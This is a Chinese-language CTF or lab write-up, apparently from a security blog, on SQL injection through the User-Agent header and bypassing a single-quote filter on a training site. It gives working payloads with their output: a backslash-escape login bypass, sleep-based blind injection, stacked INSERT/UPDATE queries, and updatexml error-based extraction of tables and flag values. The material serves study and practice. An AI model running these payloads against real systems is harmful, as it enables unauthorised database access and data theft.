---
date: "2020-12-12T00:00:00Z"
description: SQL注入之 head 注入与引号绕过
keywords: SQL注入
tags:
- 安全
- SQL注入
title: SQL注入之 head 注入与引号绕过
---

# SQL注入之 head 注入与引号绕过

> http://injectx1.lab.aqlab.cn:81/Pass-07/index.php?action=show_codea

## 0x00 先说结论

1. 使用 `-- gg` 比 `--+` 更通用，GET 中 `+` 会转为 `空格` 但 POST 中不会
2. 其他而言, `HEAD` 注入与参数注入利用方式差别不大。
3. 目前看来 `INSERT` 最难利用的是在判断 字段 **插入位置和值对应类型** 。
    + 使用 `updatexml()` 函数报错 xpath
    + 由于 0x7e 是 ~ ，不属于xpath语法格式， 因此报出xpath语法错误。

## 0x01 分析代码

```php
$username = $_POST['username'];
$password = $_POST['password'];
// 获取 useragent
$uagent = $_SERVER['HTTP_USER_AGENT']; 
$jc = $username.$password; // 这里很重要 @1
$sql = 'select *from user where username =\''.$username.'\' and password=\''.$password.'\'';
// 检测单引号，有则报错 // @1 检查的是 username.password 的组合，其中不能出现 '
if(preg_match('/.*\'.*/',$jc)!== 0){die('为了网站安全性，禁止输入某些特定符号');}
mysqli_select_db($conn,'****');//不想告诉你库名
// 注入点 1
$result = mysqli_query($conn,$sql);
$row = mysqli_fetch_array($result);
$uname = $row['username'];
$passwd = $row['password'];
if($row){
// 注入点2 : 要求能查询到用户信息
$Insql = "INSERT INTO uagent (`uagent`,`username`) VALUES ('$uagent','$uname')";
$result1 = mysqli_query($conn,$Insql);
print_r(mysqli_error($conn));
echo '成功登录';
```

**burpsuite repeat**

```http
POST /Pass-07/index.php HTTP/1.1
Host: injectx1.lab.aqlab.cn:81
Content-Length: 51
Cache-Control: max-age=0
Origin: http://injectx1.lab.aqlab.cn:81
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://injectx1.lab.aqlab.cn:81/Pass-07/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7
Connection: close

username=123&password=123&submit=%E7%99%BB%E5%BD%95
```

## 0x02 注入

### 0x02.1 判断登录账户，尝试绕过单引号

**1. 使用双 urlencoded**， 并通过时间盲注判断是否成功
```sql
username=1%2527 or if(2>1,sleep(3),null) --+
```

> 失败

**利用2个变量的闭合4个单引号。 使用 反斜线 \ 逃脱**

```sql
-- payload
-- username=admin\&password= or 1=1 -- qwe
```

![excape-quote-login-success.png](/assets/img/post/2020/12/12/excape-quote-login-success.png)

> **注意**:

1. 变量注入不仅仅是一个位置的事情， 在多变量时，遇到反制可以混合利用。
2. `POST` 注入时， `+` 不会默认转换成 `空格`， 因此在注释语句时， 需要使用 `-- gg`。 后者使用场景更为通用。

### 0x02.2 利用 User-Agent 注入

1. **User-Agent** 或者说 **Head** 注入， 更多对应的语句是 **Insert** 或者 **Update** 这类修改语句。且这类语句执行不会有明显的执行。 利用方式常见的有一下两种
    1. **报错注入** : 使用  `updatexml()` 函数强制报错返回信息。
    2. **时间盲注**


#### 猜测利用方式

```sql
-- 猜测原始语句
INSERT INTO uagent (`uagent`,`username`) VALUES ('$uagent','$uname');
UPDATE uagent SET uagent='$uagent' where username='$username';
```

1. `mock-ver01` 模拟 : 构造 SQL 语句测试， 如果插入 `VALUES` 数量不等， 则会出现 SQL 语句错误。
2. `mock-ver02` 模拟 : 所有字段猜测正确执行成功， 可以执行。
    + **注意** 但在实际测试时。 由于时两条语句。 sleep(10) 被跳过了。 因此，或许只能在 一条语句中。
3. `mock-ver03` 模拟 : 字段数量正确，但 `id` 数据类型有误，SQL 通不过， 执行被跳过。


```sql 
-- mock-ver01
INSERT INTO uagent (`uagent`,`username`) VALUES ('Mozilla 5.0' or (select sleep(5))) -- 1 ,'$uname');


-- mock-ver02
INSERT INTO uagent(`username`,`uagent`) VALUES ('Mozilla 5.0', 'gg') ; SELECT sleep(10); -- gg ','$uagent'); 

-- mock-ver03
INSERT INTO uagent(`username`,id) VALUES ('Mozilla 5.0', 'gg') ; SELECT sleep(10); -- gg ','$uagent'); 

```

![mysql-uagent-insert-sql-mock-error-column-not-match.png](/assets/img/post/2020/12/12/mysql-uagent-insert-sql-mock-error-column-not-match.png)


如果原语句是 Update 语句。 

1. `mock sql ver01` 模拟: 虽然可以利用，但是由于 where 语句被屏蔽了导致所有数据被更新。 **三年起步, 三年起步**
2. `mock sql ver01` 模拟: 在 UPDATE 语句上更新 `Where` 条件屏蔽更新。 **狗命要紧**

```sql
-- mock sql ver01
UPDATE uagent SET uagent='Mozila 5.0' ;  (SELECT SLEEP(10)) -- gg ' where username='$username';

-- mock sql ver02
UPDATE uagent SET uagent='Mozila 5.0' WHERE 2<1 ;  (SELECT SLEEP(10)) -- gg ' where username='$username';

```

### 0x02.3 使用 updatexml() 进行报错利用

在本地 mock 语句。 与上面预测的一样， 仅在一条 `Insert` 语句中， 可以使用 ** UPDATEXML 报错注入**。

payload: `mozilla' , UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1))  -- gg `

```sql
INSERT INTO uagent (`uagent`,`username`) VALUES ('mozilla' , UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1))  -- gg ','$username') 

-- 报错信息 1105 - XPATH syntax error: '~zkaq~', Time: 0.002000s
```

![updatexml-error-based-mock.png](/assets/img/post/2020/12/12/updatexml-error-based-mock.png)


#### 利用

打开 `burpsuite` 抓包利用, 为了方便查看， 此处显示代码 `highlight` 为 `bash`, 并在 利用处使用 **注释及缩进** 高亮处理

+ ua: 错误报错出数据
+ form: 越过账户登录

```bash
POST /Pass-07/index.php HTTP/1.1
Host: injectx1.lab.aqlab.cn:81
Content-Length: 36
Cache-Control: max-age=0
Origin: http://injectx1.lab.aqlab.cn:81
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
    # User-Agent: mozilla' , UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1))  -- gg
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://injectx1.lab.aqlab.cn:81/Pass-07/index.php?action=show_code
Accept-Encoding: gzip, deflate
Accept-Language: zh,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7
Connection: close
    # username=\&password= or 1=1 ;  -- gg
```

![ua-inject-success.png](/assets/img/post/2020/12/12/ua-inject-success.png)

1. UPDATEXML() 仅支持常量。 `Only constant XPATH queries are supported`, 因此简单的时间盲注就不可用了。  
    `UPDATEXML(1,CONCAT(0x7e,   (select sleep(10))     ,0x7e),1))`
2. 由于 **布尔盲注** 返回结果是 `1/0` ， `XPATH syntax error: '~1~'` 因此可以使用。
    `UPDATEXML(1,CONCAT(0x7e,   (select 1=1)     ,0x7e),1))`


## 0x03 找 FLAG

探测完了可利用点， 又是明文报错信息。 FLAG 就好找了。

以下省略完成 BURPSUITE 文件， 仅完善可以利用语句替代 ${SQL} 位置。

```bash
User-Agent: mozilla' , UPDATEXML(1,CONCAT(0x7e, (    ${SQL}     ) ,0x7e),1))  -- gg
```


### 0x03.1 **探测表**

```sql
-- 查看当前库所有表
select group_concat(table_name) from information_schema.tables where table_schema=database() 

-- result: flag_head,ip,refer,uagent,user
```

还是比较明显了 `flag_head` 就是我们要找的。

## 0x03.2 **探测字段**

```sql
-- 查询 flag_head 字段名
select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag_head'
-- Id,flag_h1

-- 查询列数量
select count(*) from flag_head
-- result: 3

-- 查询字段值
select group_concat(flag_h1) from flag_head 
-- zKaQ-YourHd,zKaQ-Refer,zKaQ-ipi
```

解题完成


## 0xGG 引用资料

+ [通过两道CTF题学习过滤单引号的SQL注入](https://blog.csdn.net/qq_42181428/article/details/105061424)
+ [sql报错注入： extractvalue 、 updatexml 报错原理](https://developer.aliyun.com/article/692723)
+ [SQL注入实战之报错注入篇 - 0x7e 是什么](https://www.cnblogs.com/c1047509362/p/12806297.html)